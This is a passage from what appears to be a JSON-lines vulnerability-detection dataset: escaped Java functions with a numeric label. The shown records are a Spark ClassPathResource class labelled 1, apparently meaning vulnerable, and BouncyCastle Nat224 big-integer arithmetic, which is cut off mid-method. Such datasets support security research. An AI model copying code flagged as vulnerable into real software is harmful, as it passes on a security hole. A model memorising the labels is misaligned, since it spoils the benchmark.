StringUtils.cleanPath(path);\n        this.classLoader = classLoader;\n        this.clazz = clazz;\n    }\n\n    /**\n     * Return the path for this resource (as resource path within the class path).\n     *\n     * @return the path\n     */\n    public final String getPath() {\n        return this.path;\n    }\n\n    /**\n     * This implementation checks for the resolution of a resource URL.\n     *\n     * @return if exists.\n     * @see java.lang.ClassLoader#getResource(String)\n     * @see java.lang.Class#getResource(String)\n     */\n    @Override\n    public boolean exists() {\n        URL url;\n        if (this.clazz != null) {\n            url = this.clazz.getResource(this.path);\n        } else {\n            url = this.classLoader.getResource(this.path);\n        }\n        return (url != null);\n    }\n\n    /**\n     * This implementation opens an InputStream for the given class path resource.\n     *\n     * @return the input stream.\n     * @see java.lang.ClassLoader#getResourceAsStream(String)\n     * @see java.lang.Class#getResourceAsStream(String)\n     */\n    @Override\n    public InputStream getInputStream() throws IOException {\n        InputStream is;\n        if (this.clazz != null) {\n            is = this.clazz.getResourceAsStream(this.path);\n        } else {\n            is = this.classLoader.getResourceAsStream(this.path);\n        }\n        if (is == null) {\n            throw new FileNotFoundException(getDescription() + \" cannot be opened because it does not exist\");\n        }\n        return is;\n    }\n\n    /**\n     * This implementation returns a URL for the underlying class path resource.\n     *\n     * @return the url.\n     * @see java.lang.ClassLoader#getResource(String)\n     * @see java.lang.Class#getResource(String)\n     */\n    @Override\n    public URL getURL() throws IOException {\n        URL url;\n        if (this.clazz != null) {\n            url = this.clazz.getResource(this.path);\n        } else {\n            url = this.classLoader.getResource(this.path);\n        }\n        if (url == null) {\n            throw new FileNotFoundException(getDescription() + \" cannot be resolved to URL because it does not exist\");\n        }\n        return url;\n    }\n\n    /**\n     * This implementation creates a ClassPathResource, applying the given path\n     * relative to the path of the underlying resource of this descriptor.\n     *\n     * @return the resource.\n     * @see spark.utils.StringUtils#applyRelativePath(String, String)\n     */\n    @Override\n    public Resource createRelative(String relativePath) {\n        String pathToUse = StringUtils.applyRelativePath(this.path, relativePath);\n        return new ClassPathResource(pathToUse, this.classLoader, this.clazz);\n    }\n\n    /**\n     * This implementation returns the name of the file that this class path\n     * resource refers to.\n     *\n     * @return the file name.\n     * @see spark.utils.StringUtils#getFilename(String)\n     */\n    @Override\n    public String getFilename() {\n        return StringUtils.getFilename(this.path);\n    }\n\n    /**\n     * This implementation returns a description that includes the class path location.\n     *\n     * @return the description.\n     */\n    @Override\n    public String getDescription() {\n        StringBuilder builder = new StringBuilder(\"class path resource [\");\n        String pathToUse = path;\n        if (this.clazz != null && !pathToUse.startsWith(\"/\")) {\n            builder.append(ClassUtils.classPackageAsResourcePath(this.clazz));\n            builder.append('/');\n        }\n        if (pathToUse.startsWith(\"/\")) {\n            pathToUse = pathToUse.substring(1);\n        }\n        builder.append(pathToUse);\n        builder.append(']');\n        return builder.toString();\n    }\n\n    /**\n     * This implementation compares the underlying class path locations.\n     *\n     * @return if equals.\n     */\n    @Override\n    public boolean equals(Object obj) {\n        if (obj == this) {\n            return true;\n        }\n        if (obj instanceof ClassPathResource) {\n            ClassPathResource otherRes = (ClassPathResource) obj;\n\n            ClassLoader thisLoader = this.classLoader;\n            ClassLoader otherLoader = otherRes.classLoader;\n\n            return (this.path.equals(otherRes.path) &&\n                thisLoader.equals(otherLoader) &&\n                this.clazz.equals(otherRes.clazz));\n        }\n        return false;\n    }\n\n    /**\n     * This implementation returns the hash code of the underlying\n     * class path location.\n     *\n     * @return the hash code.\n     */\n    @Override\n    public int hashCode() {\n        return this.path.hashCode();\n    }\n\n}\n", "target": 1}
{"idx": 1095, "func": "package org.bouncycastle.math.raw;\n\nimport java.math.BigInteger;\n\nimport org.bouncycastle.util.Pack;\n\npublic abstract class Nat224\n{\n    private static final long M = 0xFFFFFFFFL;\n\n    public static int add(int[] x, int[] y, int[] z)\n    {\n        long c = 0;\n        c += (x[0] & M) + (y[0] & M);\n        z[0] = (int)c;\n        c >>>= 32;\n        c += (x[1] & M) + (y[1] & M);\n        z[1] = (int)c;\n        c >>>= 32;\n        c += (x[2] & M) + (y[2] & M);\n        z[2] = (int)c;\n        c >>>= 32;\n        c += (x[3] & M) + (y[3] & M);\n        z[3] = (int)c;\n        c >>>= 32;\n        c += (x[4] & M) + (y[4] & M);\n        z[4] = (int)c;\n        c >>>= 32;\n        c += (x[5] & M) + (y[5] & M);\n        z[5] = (int)c;\n        c >>>= 32;\n        c += (x[6] & M) + (y[6] & M);\n        z[6] = (int)c;\n        c >>>= 32;\n        return (int)c;\n    }\n\n    public static int add(int[] x, int xOff, int[] y, int yOff, int[] z, int zOff)\n    {\n        long c = 0;\n        c += (x[xOff + 0] & M) + (y[yOff + 0] & M);\n        z[zOff + 0] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 1] & M) + (y[yOff + 1] & M);\n        z[zOff + 1] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 2] & M) + (y[yOff + 2] & M);\n        z[zOff + 2] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 3] & M) + (y[yOff + 3] & M);\n        z[zOff + 3] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 4] & M) + (y[yOff + 4] & M);\n        z[zOff + 4] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 5] & M) + (y[yOff + 5] & M);\n        z[zOff + 5] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 6] & M) + (y[yOff + 6] & M);\n        z[zOff + 6] = (int)c;\n        c >>>= 32;\n        return (int)c;\n    }\n\n    public static int addBothTo(int[] x, int[] y, int[] z)\n    {\n        long c = 0;\n        c += (x[0] & M) + (y[0] & M) + (z[0] & M);\n        z[0] = (int)c;\n        c >>>= 32;\n        c += (x[1] & M) + (y[1] & M) + (z[1] & M);\n        z[1] = (int)c;\n        c >>>= 32;\n        c += (x[2] & M) + (y[2] & M) + (z[2] & M);\n        z[2] = (int)c;\n        c >>>= 32;\n        c += (x[3] & M) + (y[3] & M) + (z[3] & M);\n        z[3] = (int)c;\n        c >>>= 32;\n        c += (x[4] & M) + (y[4] & M) + (z[4] & M);\n        z[4] = (int)c;\n        c >>>= 32;\n        c += (x[5] & M) + (y[5] & M) + (z[5] & M);\n        z[5] = (int)c;\n        c >>>= 32;\n        c += (x[6] & M) + (y[6] & M) + (z[6] & M);\n        z[6] = (int)c;\n        c >>>= 32;\n        return (int)c;\n    }\n\n    public static int addBothTo(int[] x, int xOff, int[] y, int yOff, int[] z, int zOff)\n    {\n        long c = 0;\n        c += (x[xOff + 0] & M) + (y[yOff + 0] & M) + (z[zOff + 0] & M);\n        z[zOff + 0] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 1] & M) + (y[yOff + 1] & M) + (z[zOff + 1] & M);\n        z[zOff + 1] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 2] & M) + (y[yOff + 2] & M) + (z[zOff + 2] & M);\n        z[zOff + 2] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 3] & M) + (y[yOff + 3] & M) + (z[zOff + 3] & M);\n        z[zOff + 3] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 4] & M) + (y[yOff + 4] & M) + (z[zOff + 4] & M);\n        z[zOff + 4] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 5] & M) + (y[yOff + 5] & M) + (z[zOff + 5] & M);\n        z[zOff + 5] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 6] & M) + (y[yOff + 6] & M) + (z[zOff + 6] & M);\n        z[zOff + 6] = (int)c;\n        c >>>= 32;\n        return (int)c;\n    }\n\n    public static int addTo(int[] x, int[] z)\n    {\n        long c = 0;\n        c += (x[0] & M) + (z[0] & M);\n        z[0] = (int)c;\n        c >>>= 32;\n        c += (x[1] & M) + (z[1] & M);\n        z[1] = (int)c;\n        c >>>= 32;\n        c += (x[2] & M) + (z[2] & M);\n        z[2] = (int)c;\n        c >>>= 32;\n        c += (x[3] & M) + (z[3] & M);\n        z[3] = (int)c;\n        c >>>= 32;\n        c += (x[4] & M) + (z[4] & M);\n        z[4] = (int)c;\n        c >>>= 32;\n        c += (x[5] & M) + (z[5] & M);\n        z[5] = (int)c;\n        c >>>= 32;\n        c += (x[6] & M) + (z[6] & M);\n        z[6] = (int)c;\n        c >>>= 32;\n        return (int)c;\n    }\n\n    public static int addTo(int[] x, int xOff, int[] z, int zOff, int cIn)\n    {\n        long c = cIn & M;\n        c += (x[xOff + 0] & M) + (z[zOff + 0] & M);\n        z[zOff + 0] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 1] & M) + (z[zOff + 1] & M);\n        z[zOff + 1] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 2] & M) + (z[zOff + 2] & M);\n        z[zOff + 2] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 3] & M) + (z[zOff + 3] & M);\n        z[zOff + 3] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 4] & M) + (z[zOff + 4] & M);\n        z[zOff + 4] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 5] & M) + (z[zOff + 5] & M);\n        z[zOff + 5] = (int)c;\n        c >>>= 32;\n        c += (x[xOff + 6] & M) + (z[zOff + 6] & M);\n        z[zOff + 6] = (int)c;\n        c >>>= 32;\n        return (int)c;\n    }\n\n    public static int addToEachOther(int[] u, int uOff, int[] v, int vOff)\n    {\n        long c = 0;\n        c += (u[uOff + 0] & M) + (v[vOff + 0] & M);\n        u[uOff + 0] = (int)c;\n        v[vOff + 0] = (int)c;\n        c >>>= 32;\n        c += (u[uOff + 1] & M) + (v[vOff + 1] & M);\n        u[uOff + 1] = (int)c;\n        v[vOff + 1] = (int)c;\n        c >>>= 32;\n        c += (u[uOff + 2] & M) + (v[vOff + 2] & M);\n        u[uOff + 2] = (int)c;\n        v[vOff + 2] = (int)c;\n        c >>>= 32;\n        c += (u[uOff + 3] & M) + (v[vOff + 3] & M);\n        u[uOff + 3] = (int)c;\n        v[vOff + 3] = (int)c;\n        c >>>= 32;\n        c += (u[uOff + 4] & M) + (v[vOff + 4] & M);\n        u[uOff + 4] = (int)c;\n        v[vOff + 4] = (int)c;\n        c >>>= 32;\n        c += (u[uOff + 5] & M) + (v[vOff + 5] & M);\n        u[uOff + 5] = (int)c;\n        v[vOff + 5] = (int)c;\n        c >>>= 32;\n        c += (u[uOff + 6] & M) + (v[vOff + 6] & M);\n        u[uOff + 6] = (int)c;\n        v[vOff + 6] = (int)c;\n        c >>>= 32;\n        return (int)c;\n    }\n\n    public static void copy(int[] x, int[] z)\n    {\n        z[0] = x[0];\n        z[1] = x[1];\n        z[2] = x[2];\n        z[3] = x[3];\n        z[4] = x[4];\n        z[5] = x[5];\n        z[6] = x[6];\n    }\n\n    public static int[] create()\n    {\n        return new int[7];\n    }\n\n    public static int[] createExt()\n    {\n        return new int[14];\n    }\n\n    public static boolean diff(int[] x, int xOff, int[] y, int yOff, int[] z, int zOff)\n    {\n        boolean pos = gte(x, xOff, y, yOff);\n        if (pos)\n        {\n            sub(x, xOff, y, yOff, z, zOff);\n        }\n        else\n        {\n            sub(y, yOff, x, xOff, z, zOff);\n        }\n        return pos;\n    }\n\n    public static boolean eq(int[] x, int[] y)\n    {\n        for (int i = 6; i >= 0; --i)\n        {\n            if (x[i] != y[i])\n            {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public static int[] fromBigInteger(BigInteger x)\n    {\n        if (x.signum() < 0 || x.bitLength() > 224)\n        {\n            throw new IllegalArgumentException();\n        }\n\n        int[] z = create();\n        int i = 0;\n        while (x.signum() != 0)\n        {\n            z[i++] = x.intValue();\n            x = x.shiftRight(32);\n        }\n        return z;\n    }\n\n    public static int getBit(int[] x, int bit)\n    {\n        if (bit == 0)\n        {\n            return x[0] & 1;\n        }\n        int w = bit >> 5;\n        if (w < 0 || w >= 7)\n        {\n            return 0;\n        }\n        int b = bit & 31;\n        return (x[w] >>> b) & 1;\n    }\n\n    public static boolean gte(int[] x, int[] y)\n    {\n        for (int i = 6; i >= 0; --i)\n        {\n            int x_i = x[i] ^ Integer.MIN_VALUE;\n            int y_i = y[i] ^ Integer.MIN_VALUE;\n            if (x_i < y_i)\n                return false;\n            if (x_i > y_i)\n                return true;\n        }\n        return true;\n    }\n\n    public static boolean gte(int[] x, int xOff, int[] y, int yOff)\n    {\n        for (int i = 6; i >= 0; --i)\n        {\n            int x_i = x[xOff + i] ^ Integer.MIN_VALUE;\n            int y_i = y[yOff + i] ^ Integer.MIN_VALUE;\n            if (x_i < y_i)\n                return false;\n            if (x_i > y_i)\n                return true;\n        }\n        return true;\n    }\n\n    public static boolean isOne(int[] x)\n    {\n        if (x[0] != 1)\n        {\n            return false;\n        }\n        for (int i = 1; i < 7; ++i)\n        {\n            if (x[i] != 0)\n            {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public static boolean isZero(int[] x)\n    {\n        for (int i = 0; i < 7; ++i)\n        {\n            if (x[i] != 0)\n            {\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public static void mul(int[] x, int[] y, int[] zz)\n    {\n        long y_0 = y[0] & M;\n        long y_1 = y[1] & M;\n        long y_2 = y[2] & M;\n        long y_3 = y[3] & M;\n        long y_4 = y[4] & M;\n        long y_5 = y[5] & M;\n        long y_6 = y[6] & M;\n\n        {\n            long c = 0, x_0 = x[0] & M;\n            c += x_0 * y_0;\n            zz[0] = (int)c;\n            c >>>= 32;\n            c += x_0 * y_1;\n            zz[1] = (int)c;\n            c >>>= 32;\n            c += x_0 * y_2;\n            zz[2] = (int)c;\n            c >>>= 32;\n            c += x_0 * y_3;\n            zz[3] = (int)c;\n            c >>>= 32;\n            c += x_0 * y_4;\n            zz[4] = (int)c;\n            c >>>= 32;\n            c += x_0 * y_5;\n            zz[5] = (int)c;\n            c >>>= 32;\n            c += x_0 * y_6;\n            zz[6] = (int)c;\n            c >>>= 32;\n            zz[7] = (int)c;\n        }\n\n        for (int i = 1; i < 7; ++i)\n        {\n            long c = 0, x_i = x[i] & M;\n            c += x_i * y_0 + (zz[i + 0] & M);\n            zz[i + 0] = (int)c;\n            c >>>= 32;\n            c += x_i * y_1 + (zz[i + 1] & M);\n            zz[i + 1] = (int)c;\n            c >>>= 32;\n            c += x_i * y_2 + (zz[i + 2] & M);\n            zz[i + 2] = (int)c;\n            c >>>= 32;\n            c += x_i * y_3 + (zz[i + 3] & M);\n            zz[i + 3] = (int)c;\n            c >>>= 32;\n            c += x_i * y_4 + (zz[i + 4] & M);\n            zz[i + 4] = (int)c;\n            c >>>= 32;\n            c += x_i * y_5 + (zz[i + 5] & M);\n            zz[i + 5] = (int)c;\n            c >>>= 32;\n            c += x_i * y_6 + (zz[i + 6] & M);\n            zz[i + 6] = (int)c;\n            c >>>= 32;\n            zz[i + 7] = (int)c;\n        }\n    }\n\n    public static void mul(int[] x, int xOff, int[] y, int yOff, int[] zz, int zzOff)\n    {\n        long y_0 = y[yOff + 0] & M;\n        long y_1 = y[yOff + 1] & M;\n        long y_2 = y[yOff + 2] & M;\n        long y_3 = y[yOff + 3] & M;\n        long y_4 = y[yOff + 4] & M;\n        long y_5 = y[yOff + 5] & M;\n        long y_6 = y[yOff + 6] & M;\n\n        {\n            long c = 0, x_0 = x[xOff + 0] & M;\n            c += x_0 * y_0;\n            zz[zzOff + 0] = (int)c;\n            c >>>= 32;\n            c += x_0 * y_1;\n            zz[zzOff + 1] = (int)c;\n            c >>>= 32;\n            c += x_0 * y_2;\n            zz[zzOff + 2] = (int)c;\n            c >>>= 32;\n            c += x_0 * y_3;\n            zz[zzOff + 3] = (int)c;\n            c >>>= 32;\n            c += x_0 * y_4;\n            zz[zzOff + 4] = (int)c;\n            c >>>= 32;\n            c += x_0 * y_5;\n            zz[zzOff + 5] = (int)c;\n            c >>>= 32;\n            c += x_0 * y_6;\n            zz[zzOff + 6] = (int)c;\n            c >>>= 32;\n            zz[zzOff + 7] = (int)c;\n        }\n\n        for (int i = 1; i < 7; ++i)\n        {\n            ++zzOff;\n            long c = 0, x_i = x[xOff + i] & M;\n            c += x_i * y_0 + (zz[zzOff + 0] & M);\n            zz[zzOff + 0] = (int)c;\n            c >>>= 32;\n            c += x_i * y_1 + (zz[zzOff + 1] & M);\n            zz[zzOff + 1] = (int)c;\n            c >>>= 32;\n            c += x_i * y_2 + (zz[zzOff + 2] & M);\n            zz[zzOff + 2] = (int)c;\n            c >>>= 32;\n            c += x_i * y_3 + (zz[zzOff + 3] & M);\n            zz[zzOff + 3] = (int)c;\n            c >>>= 32;\n            c += x_i * y_4 + (zz[zzOff + 4] & M);\n            zz[zzOff + 4] = (int)c;\n            c >>>= 32;\n            c += x_i * y_5 + (zz[zzOff + 5] & M);\n            zz[zzOff + 5] = (int)c;\n            c >>>= 32;\n            c += x_i * y_6 + (zz[zzOff + 6] & M);\n            zz[zzOff + 6] = (int)c;\n            c >>>= 32;\n            zz[zzOff + 7] = (int)c;\n        }\n    }\n\n    public static int mulAddTo(int[] x, int[] y, int[] zz)\n    {\n        long y_0 = y[0] & M;\n        long y_1 = y[1] & M;\n        long y_2 = y[2] & M;\n        long y_3 = y[3] & M;\n        long y_4 = y[4] & M;\n        long y_5 = y[5] & M;\n        long y_6 = y[6] & M;\n\n        long zc = 0;\n        for (int i = 0; i < 7; ++i)\n        {\n            long c = 0, x_i = x[i] & M;\n            c += x_i * y_0 + (zz[i + 0] & M);\n            zz[i + 0] = (int)c;\n            c >>>= 32;\n            c += x_i * y_1 + (zz[i + 1] & M);\n            zz[i + 1] = (int)c;\n            c >>>= 32;\n            c += x_i * y_2 + (zz[i + 2] & M);\n            zz[i + 2] = (int)c;\n            c >>>= 32;\n            c += x_i * y_3 + (zz[i + 3] & M);\n            zz[i + 3] = (int)c;\n            c >>>= 32;\n            c += x_i * y_4 + (zz[i + 4] & M);\n            zz[i + 4] = (int)c;\n            c >>>= 32;\n            c += x_i * y_5 + (zz[i + 5] & M);\n            zz[i + 5] = (int)c;\n            c >>>= 32;\n            c += x_i * y_6 + (zz[i + 6] & M);\n            zz[i + 6] = (int)c;\n            c >>>= 32;\n            c += zc + (zz[i + 7] & M);\n            zz[i + 7] = (int)c;\n            zc = c >>> 32;\n        }\n        return (int)zc;\n    }\n\n    public static int mulAddTo(int[] x, int xOff, int[] y, int yOff, int[] zz, int zzOff)\n    {\n        long y_0 = y[yOff + 0] & M;\n        long y_1 = y[yOff + 1] & M;\n        long y_2 = y[yOff + 2] & M;\n        long y_3 = y[yOff + 3] & M;\n        long y_4 = y[yOff + 4] & M;\n        long y_5 = y[yOff + 5] & M;\n        long y_6 = y[yOff + 6] & M;\n\n        long zc = 0;\n        for (int i = 0; i < 7; ++i)\n        {\n            long c = 0, x_i = x[xOff + i] & M;\n            c += x_i * y_0 + (zz[zzOff + 0] & M);\n            zz[zzOff + 0] = (int)c;\n            c >>>= 32;\n            c += x_i * y_1 + (zz[zzOff + 1] & M);\n            zz[zzOff + 1] = (int)c;\n            c >>>= 32;\n            c += x_i * y_2 + (zz[zzOff + 2] & M);\n            zz[zzOff + 2] = (int)c;\n            c >>>= 32;\n            c += x_i * y_3 + (zz[zzOff + 3] & M);\n            zz[zzOff + 3] = (int)c;\n            c >>>= 32;\n            c += x_i * y_4 + (zz[zzOff + 4] & M);\n            zz[zzOff + 4] = (int)c;\n            c >>>= 32;\n            c += x_i * y_5 + (zz[zzOff + 5] & M);\n            zz[zzOff + 5] = (int)c;\n            c >>>= 32;\n            c += x_i * y_6 + (zz[zzOff + 6] & M);\n            zz[zzOff + 6] = (int)c;\n            c >>>= 32;\n            c += zc + (zz[zzOff + 7] & M);\n            zz[zzOff + 7] = (int)c;\n            zc = c >>> 32;\n            ++zzOff;\n        }\n        return (int)zc;\n    }\n\n    public static long mul33Add(int w, int[] x, int xOff, int[] y, int yOff, int[] z, int zOff)\n    {\n        // assert w >>> 31 == 0;\n\n        long c = 0, wVal = w & M;\n        long x0 = x[xOff + 0] & M;\n        c += wVal * x0 + (y[yOff + 0] & M);\n        z[zOff + 0] = (int)c;\n        c >>>= 32;\n        long x1 = x[xOff + 1] & M;\n        c += wVal * x1 + x0 + (y[yOff + 1] & M);\n        z[zOff + 1] = (int)c;\n        c >>>= 32;\n        long x2 = x[xOff + 2] & M;\n        c += wVal * x2 + x1 + (y[yOff + 2] & M);\n        z[zOff + 2] = (int)c;\n        c >>>= 32;\n        long x3 = x[xOff + 3] & M;\n        c += wVal * x3 + x2 + (y[yOff + 3] & M);\n        z[zOff + 3] = (int)c;\n        c >>>= 32;\n        long x4 = x[xOff + 4] & M;\n        c += wVal * x4 + x3 + (y[yOff + 4] & M);\n        z[zOff + 4] = (int)c;\n        c >>>= 32;\n        long x5 = x[xOff + 5] & M;\n        c += wVal * x5 + x4 + (y[yOff + 5] & M);\n        z[zOff + 5] = (int)c;\n        c >>>= 32;\n        long x6 = x[xOff + 6] & M;\n        c += wVal * x6 + x5 + (y[yOff + 6] & M);\n        z[zOff + 6] = (int)c;\n        c >>>= 32;\n        c += x6;\n        return c;\n    }\n\n    public static int mulByWord(int x, int[] z)\n    {\n        long c = 0, xVal = x & M;\n        c += xVal * (z[0] & M);\n        z[0] = (int)c;\n        c >>>= 32;\n        c += xVal * (z[1] & M);\n        z[1] = (int)c;\n        c >>>= 32;\n        c += xVal * (z[2] & M);\n        z[2] = (int)c;\n        c >>>= 32;\n        c += xVal * (z[3] & M);\n        z[3] = (int)c;\n        c >>>= 32;\n        c += xVal * (z[4] & M);\n        z[4] = (int)c;\n        c >>>= 32;\n        c += xVal * (z[5] & M);\n        z[5] = (int)c;\n        c >>>= 32;\n        c += xVal * (z[6] & M);\n        z[6] = (int)c;\n        c >>>= 32;\n        return (int)c;\n    }\n\n    public static int mulByWordAddTo(int x, int[] y, int[] z)\n    {\n        long c = 0, xVal = x & M;\n        c += xVal * (z[0] & M) + (y[0] & M);\n        z[0] = (int)c;\n        c >>>= 32;\n        c += xVal * (z[1] & M) + (y[1] & M);\n        z[1] = (int)c;\n        c >>>= 32;\n        c += xVal * (z[2] & M) + (y[2] & M);\n        z[2] = (int)c;\n        c >>>= 32;\n        c += xVal * (z[3] & M) + (y[3] & M);\n        z[3] = (int)c;\n        c >>>= 32;\n        c += xVal * (z[4] & M) + (y[4] & M);\n        z[4] = (int)c;\n        c >>>= 32;\n        c += xVal * (z[5] & M) + (y[5] & M);\n        z[5] = (int)c;\n        c >>>= 32;\n        c += xVal * (z[6] & M) + (y[6] & M);\n        z[6] = (int)c;\n        c >>>= 32;\n        return (int)c;\n    }\n\n    public static int mulWordAddTo(int x, int[] y, int yOff, int[] z, int zOff)\n    {\n        long c = 0, xVal = x & M;\n        c += xVal * (y[yOff + 0] & M) + (z[zOff + 0] & M);\n        z[zOff + 0] = (int)c;\n        c >>>= 32;\n        c += xVal * (y[yOff + 1] & M) + (z[zOff + 1] & M);\n        z[zOff + 1] = (int)c;\n        c >>>= 32;\n        c += xVal * (y[yOff + 2] & M) + (z[zOff + 2] & M);\n        z[zOff + 2] = (int)c;\n        c >>>= 32;\n        c += xVal * (y[yOff + 3] & M) + (z[zOff + 3] & M);\n        z[zOff + 3] = (int)c;\n        c >>>= 32;\n        c += xVal * (y[yOff + 4] & M) + (z[zOff + 4] & M);\n        z[zOff + 4] = (int)c;\n        c >>>= 32;\n        c += xVal * (y[yOff + 5] & M) + (z[zOff + 5] & M);\n        z[zOff + 5] = (int)c;\n        c >>>= 32;\n        c += xVal * (y[yOff + 6] & M) + (z[zOff + 6] & M);\n        z[zOff + 6] = (int)c;\n        c >>>= 32;\n        return (int)c;\n    }\n\n    public static int mul33DWordAdd(int x, long y, int[] z, int zOff)\n    {\n        // assert x >>> 31 == 0;\n        // assert zOff <= 3;\n\n        long c = 0, xVal = x & M;\n        long y00 = y & M;\n        c += xVal * y00 + (z[zOff + 0] & M);\n        z[zOff + 0] = (int)c;\n        c >>>= 32;\n        long y01 = y >>> 32;\n        c += xVal * y01 + y00 + (z[zOff + 1] & M);\n        z[zOff + 1] = (int)c;\n        c >>>= 32;\n        c += y01 + (z[zOff + 2] & M);\n        z[zOff + 2] = (int)c;\n        c >>>= 32;\n        c += (z[zOff + 3] & M);\n        z[zOff + 3] = (int)c;\n        c >>>= 32;\n        return c == 0 ? 0 : Nat.incAt(7, z, zOff, 4);\n    }\n\n    public static int mul33WordAdd(int x, int y, int[] z, int zOff)\n    {\n        // assert x >>> 31 == 0;\n        // assert zOff <= 4;\n\n        long c = 0, xVal = x & M, yVal = y & M;\n        c += yVal * xVal + (z[zOff + 0] & M);\n        z[zOff + 0] = (int)c;\n        c >>>= 32;\n        c += yVal + (z[zOff + 1] & M);\n        z[zOff + 1] = (int)c;\n        c >>>= 32;\n        c += (z[zOff + 2] & M);\n        z[zOff + 2] = (int)c;\n        c >>>= 32;\n        return c == 0 ? 0 : Nat.incAt(7, z, zOff, 3);\n    }\n\n    public static int mulWordDwordAdd(int x, long y, int[] z, int zOff)\n    {\n        // assert zOff <= 4;\n        long c = 0, xVal = x & M;\n        c += xVal * (y & M) + (z[zOff + 0] & M);\n        z[zOff + 0] = (int)c;\n        c >>>= 32;\n        c += xVal * (y >>> 32) + (z[zOff + 1] & M);\n        z[zOff + 1] = (int)c;\n        c >>>= 32;\n        c += (z[zOff + 2] & M);\n        z[zOff + 2] = (int)c;\n        c >>>= 32;\n        return c == 0 ? 0 : Nat.incAt(7, z, zOff, 3);\n    }\n\n    public static int mulWord(int x, int[] y, int[] z, int zOff)\n    {\n        long c = 0, xVal = x & M;\n        int i = 0;\n        do\n        {\n            c += xVal * (y[i] & M);\n            z[zOff + i] = (int)c;\n            c >>>= 32;\n        }\n        while (++i < 7);\n        return (int)c;\n    }\n\n    public static void square(int[] x, int[] zz)\n    {\n        long x_0 = x[0] & M;\n        long zz_1;\n\n        int c = 0, w;\n        {\n            int i = 6, j = 14;\n            do\n            {\n                long xVal = (x[i--] & M);\n                long p = xVal * xVal;\n                zz[--j] = (c << 31) | (int)(p >>> 33);\n                zz[--j] = (int)(p >>> 1);\n                c = (int)p;\n            }\n            while (i > 0);\n\n            {\n                long p = x_0 * x_0;\n                zz_1 = ((c << 31) & M) | (p >>> 33);\n                zz[0] = (int)p;\n                c = (int)(p >>> 32) & 1;\n            }\n        }\n\n        long x_1 = x[1] & M;\n        long zz_2 = zz[2] & M;\n\n        {\n            zz_1 += x_1 * x_0;\n            w = (int)zz_1;\n            zz[1] = (w << 1) | c;\n            c = w >>> 31;\n            zz_2 += zz_1 >>> 32;\n        }\n\n        long x_2 = x[2] & M;\n        long zz_3 = zz[3] & M;\n        long zz_4 = zz[4] & M;\n        {\n            zz_2 += x_2 * x_0;\n            w = (int)zz_2;\n            zz[2] = (w << 1) | c;\n            c = w >>> 31;\n            zz_3 += (zz_2 >>> 32) + x_2 * x_1;\n            zz_4 += zz_3 >>> 32;\n            zz_3 &= M;\n        }\n\n        long x_3 = x[3] & M;\n        long zz_5 = zz[5] & M;\n        long zz_6 = zz[6] & M;\n        {\n            zz_3 += x_3 * x_0;\n            w = (int)zz_3;\n            zz[3] = (w << 1) | c;\n            c = w >>> 31;\n            zz_4 += (zz_3 >>> 32) + x_3 * x_1;\n            zz_5 += (zz_4 >>> 32) + x_3 * x_2;\n            zz_4 &= M;\n            zz_6 += zz_5 >>> 32;\n            zz_5 &= M;\n        }\n\n        long x_4 = x[4] & M;\n        long zz_7 = zz[7] & M;\n        long zz_8 = zz[8] & M;\n        {\n            zz_4 += x_4 * x_0;\n            w = (int)zz_4;\n            zz[4] = (w << 1) | c;\n            c = w >>> 31;\n            zz_5 += (zz_4 >>> 32) + x_4 * x_1;\n            zz_6 += (zz_5 >>> 32) + x_4 * x_2;\n            zz_5 &= M;\n            zz_7 += (zz_6 >>> 32) + x_4 * x_3;\n            zz_6 &= M;\n            zz_8 += zz_7 >>> 32;\n            zz_7 &= M;\n        }\n\n        long x_5 = x[5] & M;\n        long zz_9 = zz[9] & M;\n        long zz_10 = zz[10] & M;\n        {\n            zz_5 += x_5 * x_0;\n            w = (int)zz_5;\n            zz[5] = (w << 1) | c;\n            c = w >>> 31;\n            zz_6 += (zz_5 >>> 32) + x_5 * x_1;\n            zz_7 += (zz_6 >>> 32) + x_5 * x_2;\n            zz_6 &= M;\n            zz_8 += (zz_7 >>> 32) + x_5 * x_3;\n            zz_7 &= M;\n            zz_9 += (zz_8 >>> 32) + x_5 * x_4;\n            zz_8 &= M;\n            zz_10 += zz_9 >>> 32;\n            zz_9 &= M;\n        }\n\n        long x_6 = x[6] & M;\n        long zz_11 = zz[11] & M;\n        long zz_12 = zz[12] & M;\n        {\n            zz_6 += x_6 * x_0;\n            w = (int)zz_6;\n            zz[6] = (w << 1) | c;\n            c = w >>> 31;\n            zz_7 += (zz_6 >>> 32) + x_6 * x_1;\n            zz_8 += (zz_7 >>> 32) + x_6 * x_2;\n            zz_9 += (zz_8 >>> 32) + x_6 * x_3;\n            zz_10 += (zz_9 >>> 32) + x_6 * x_4;\n            zz_11 += (zz_10 >>> 32) + x_6 * x_5;\n            zz_12 += zz_11 >>> 32;\n        }\n\n        w = (int)zz_7;\n        zz[7] = (w << 1) | c;\n        c = w >>> 31;\n        w = (int)zz_8;\n        zz[8] = (w << 1) | c;\n        c = w >>> 31;\n        w = (int)zz_9;\n        zz[9] = (w << 1) | c;\n        c = w >>> 31;\n        w = (int)zz_10;\n        zz[10] = (w << 1) | c;\n        c = w >>> 31;\n        w = (int)zz_11;\n        zz[11] = (w << 1) | c;\n        c = w >>> 31;\n        w = (int)zz_12;\n        zz[12] = (w << 1) | c;\n        c = w >>> 31;\n        w = zz[13] + (int)(zz_12 >> 32);\n        zz[13] = (w << 1) | c;\n    }\n\n    public static void square(int[] x, int xOff, int[] zz, int zzOff)\n    {\n        long x_0 = x[xOff + 0] & M;\n        long zz_1;\n\n   